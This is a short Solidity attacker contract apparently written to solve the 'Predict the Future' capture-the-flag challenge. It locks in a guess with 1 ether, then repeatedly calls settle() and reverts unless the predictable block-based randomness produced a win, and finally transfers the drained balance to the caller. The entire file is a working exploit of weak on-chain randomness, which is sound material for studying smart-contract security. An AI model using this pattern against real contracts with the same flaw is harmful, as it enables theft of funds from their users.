
pragma solidity ^0.8.9;

interface IChallenge {
    function isComplete() external view returns (bool);
    function settle() external;
    function lockInGuess(uint8 n) external payable;
}

contract PredictTheFutureAttacker {
    IChallenge private challenge;
    constructor (address challengeAddress) {
      challenge = IChallenge(challengeAddress);
    }
    function lock() external payable{
        challenge.lockInGuess{value:1 ether}(uint8(0));
    }

    function attack() external payable {
        challenge.settle();
        require(challenge.isComplete(),"challenge not completed");
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}